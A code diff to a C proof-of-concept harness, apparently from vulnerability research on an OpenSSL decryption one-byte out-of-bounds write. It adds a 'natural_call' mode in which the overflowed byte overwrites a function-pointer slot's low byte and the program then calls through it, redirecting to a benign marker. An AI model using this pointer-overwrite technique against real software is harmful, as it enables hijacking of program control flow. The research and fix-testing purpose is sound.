@@ -8,12 +8,12 @@
 // A 256-byte-aligned dispatch table makes the redirect observable: table[0]
 // is the normal handler, table[9] (low byte 0x48) is a benign marker.
 //
-// Modes: vuln, fixed, single, nopad, safe, natural_tag, natural_pad. The last
-// two probe compiler-chosen struct alignment without an aligned dispatch table;
-// they report layout, byte 31 and the handler low byte but do not call through
-// the pointer. Compile the same source against the vulnerable and the fixed
-// library; mode selects the decryption shape. This is a synthetic consumer
-// (rung-4 pointer control), not a real app or remote command execution.
+// Modes: vuln, fixed, single, nopad, safe, natural_tag, natural_pad,
+// natural_call. The last three probe compiler-chosen struct alignment without
+// #pragma pack; natural_call additionally dispatches through the naturally
+// aligned handler pointer, so the OOB byte becomes a real indirect call.
+// The same source compiles against the vulnerable and fixed libraries. This
+// is a synthetic consumer (rung-4 pointer control), not a real app or r5.
 #include <openssl/evp.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
@@ -71,6 +71,14 @@ struct nat_pad {
   void (*handler)(void);
 };
 
+// Same natural layout as nat_tag, but the field holds a table-slot address so
+// a one-byte LSB overwrite redirects the subsequent indirect call.
+struct nat_call {
+  uint8_t tag;
+  uint8_t scratch[31];
+  void (**handler)(void);
+};
+
 static int make_ct(uint8_t *ct, int *ct_len, uint8_t last) {
   uint8_t pt[32];
   for (int i = 0; i < 32; i++) {
@@ -111,6 +119,7 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
   struct rec31 *r31 = NULL;
   struct rec32 *r32 = NULL;
   struct nat_tag *nt = NULL;
+  struct nat_call *nc = NULL;
   struct nat_pad *np = NULL;
   size_t scratch_off = 0;
   size_t handler_off = 0;
@@ -120,6 +129,8 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
   int mode_safe = (strcmp(mode, "safe") == 0);
   int mode_nat_tag = (strcmp(mode, "natural_tag") == 0);
   int mode_nat_pad = (strcmp(mode, "natural_pad") == 0);
+  int mode_nat_call = (strcmp(mode, "natural_call") == 0);
+
   if (mode_nopad) {
     pad = 0;
   }
@@ -139,6 +150,18 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
       out = r32->scratch;
       slot = &r32->handler;
       alloc = r32;
+    }
+  } else if (mode_nat_call) {
+    nc = malloc(sizeof(*nc));
+    if (nc != NULL) {
+      memset(nc, 0xab, sizeof(*nc));
+      nc->tag = 1;
+      nc->handler = &g_table[0];
+      out = nc->scratch;
+      slot = &nc->handler;
+      scratch_off = offsetof(struct nat_call, scratch);
+      handler_off = offsetof(struct nat_call, handler);
+      alloc = nc;
     }
   } else if (mode_nat_tag) {
     nt = malloc(sizeof(*nt));
@@ -209,10 +232,12 @@ static void process(const uint8_t *ct, int ct_len, const char *mode) {
   if (slot != NULL || nslot != NULL) {
     void *h = (slot != NULL) ? (void *)*slot : (void *)*nslot;
     report_handler("after", mode, h);
-    if (nslot != NULL) {
+    if (mode_nat_tag || mode_nat_pad || mode_nat_call) {
       fprintf(stderr,
               "mode=%s layout scratch_off=%zu handler_off=%zu oob_byte=0x%02x\n",
               mode, scratch_off, handler_off, out[31]);
+    }
+    if (nslot != NULL) {
       fprintf(stderr, "mode=%s natural_layout_no_indirect_call\n", mode);
     } else {
       // The control datum: an indirect call through the adjacent pointer.
